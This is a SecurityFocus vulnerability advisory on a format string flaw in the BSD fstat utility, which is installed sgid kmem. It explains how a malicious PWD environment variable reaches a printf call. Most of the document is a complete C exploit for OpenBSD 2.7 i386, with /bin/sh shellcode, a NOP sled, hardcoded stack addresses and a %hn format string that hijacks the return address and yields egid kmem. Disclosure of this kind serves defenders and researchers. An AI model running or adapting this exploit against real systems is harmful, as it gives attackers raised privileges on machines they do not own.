source: http://www.securityfocus.com/bid/1746/info


fstat is a program shipped with BSD unix variants that is used to list the open files on a system. It is installed sgid kmem so it can access information about open files from the kernel memory structures.

A user definable environment variable (PWD, parent working directory) is passed as the only argument to a *printf() function within fstat. As a result, it is possible for a user to exec fstat with a value for the PWD variable that contains malicious format specifiers. These format specifiers could be layed out in the environment variable in a way that causes the *printf function interpreting them to overwrite certain bytes on the stack (like those that the return address of the function called is composed of) and manipulate the flow of execution.

An attacker, upon successful exploitation of this vulnerability, would inherit the effective privileges of the running fstat program: egid kmem. Further compromise for an experienced hacker would be trivial.

It is likely that this vulnerability affects all modern BSDs, though as of yet only OpenBSD is confirmed. 

/* 
   private caddis K2 release
   TagTeam exploit coding @$_*#%*&(#%(**(@$*($@
   werd to ADM, teso, w00w00

   sgid=kmem
*/

#include <stdio.h>

char bsd_shellcode[] =
"\xeb\x16\x5e\x31\xc0\x8d\x0e\x89"
"\x4e\x08\x89\x46\x0c\x8d\x4e\x08"
"\x50\x51\x56\x50\xb0\x3b\xcd\x80"
"\xe8\xe5\xff\xff\xff/bin/sh";

struct platform {
    char *name;
    unsigned short count;
    unsigned long dest_addr;
    unsigned long shell_addr;
    char *shellcode;
};

/* 0xdfbfc304 */

struct platform targets[2] = 
{
    { "OpenBSD 2.7 i386       ", 590, 0xdfbfc490, 0xdfbfdc98, bsd_shellcode },
    { NULL, 0, 0, 0, NULL }
};

#define SHELL 500
 
char fmt_string[9072];
char jmpcode[SHELL] = "PWD=HI";
char term[] = "TERM=xterm";

char *envs[] = { term,jmpcode, NULL};

int main(int argc, char *argv[])
{
    char chr, *p;
    int x, len = 0;
    struct platform *target;
    unsigned short low, high;
    unsigned long shell_addr[2], dest_addr[2];

    target = &targets[0];
    if (argc > 1) target->count += strtol(argv[1], NULL, 0);

    memset(fmt_string, 0, sizeof(fmt_string));
    len = (sizeof(long) * 4) + 2;
    p = fmt_string + len;
    for (x = 0; x < target->count; x++) {
        strcat(p, "%8x");
        len += 8;
    }


    shell_addr[0] = (target->shell_addr & 0xffff0000) >> 16;
    shell_addr[1] =  target->shell_addr & 0xffff;

    if (shell_addr[1] > shell_addr[0]) {
	dest_addr[0] = target->dest_addr+2;
	dest_addr[1] = target->dest_addr;
    	low  = shell_addr[0] - len;
    	high = shell_addr[1] - low - len;
    } else {
	dest_addr[0] = target->dest_addr;
	dest_addr[1] = target->dest_addr+2;
	low  = shell_addr[1] - len;
	high = shell_addr[0] - low - len;
    }

    /* allign on 4byte boundry relative to ebp */
    memcpy(fmt_string, "!!", 2);
    *(long *)&fmt_string[2]  = 0x11111111;
    *(long *)&fmt_string[6]  = dest_addr[0];
    *(long *)&fmt_string[10] = 0x11111111;
    *(long *)&fmt_string[14] = dest_addr[1];

    memset(jmpcode, 0x90, SHELL);
    strcpy(jmpcode + (SHELL - strlen(target->shellcode) - 2), target->shellcode);
    memcpy(jmpcode,"PWD=",4);

    p = fmt_string + strlen(fmt_string);
    sprintf(p, "%%%dd%%hn%%%dd%%hn", low, high);
    fmt_string[sizeof(fmt_string)] = '\0';

   execle("/usr/bin/fstat", "fstat", fmt_string, NULL, envs);
    perror("execve");
}